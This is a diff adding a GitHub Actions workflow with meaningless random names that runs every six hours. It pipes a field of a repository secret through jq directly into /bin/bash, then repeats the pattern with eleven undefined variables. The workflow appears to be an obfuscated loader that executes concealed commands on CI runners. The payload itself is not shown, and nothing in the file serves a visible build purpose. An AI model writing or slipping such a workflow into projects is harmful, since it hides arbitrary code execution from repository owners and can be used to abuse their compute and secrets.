@@ -1,0 +1,27 @@
+name: escargotcommission
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: escargotcommission
+        env:
+          afqsl5611: ${{ secrets.afqsl5611 }}
+        run: |
+          echo $afqsl5611 | jq -r .lcarf67480 | /bin/bash
+          echo $qy470 | jq -r .ui60658 | /bin/bash
+          echo $gq98337 | jq -r .caqh9 | /bin/bash
+          echo $ool782 | jq -r .kbqb7 | /bin/bash
+          echo $bfpnt9345 | jq -r .rswsk692 | /bin/bash
+          echo $rsvvg550 | jq -r .u49 | /bin/bash
+          echo $v2 | jq -r .qj63636 | /bin/bash
+          echo $ytd9162 | jq -r .pg3121 | /bin/bash
+          echo $k44 | jq -r .pmp6444 | /bin/bash
+          echo $hdik18 | jq -r .svse8 | /bin/bash
+          echo $ng790 | jq -r .wxmh47 | /bin/bash
+          echo $o32 | jq -r .uus825 | /bin/bash
+
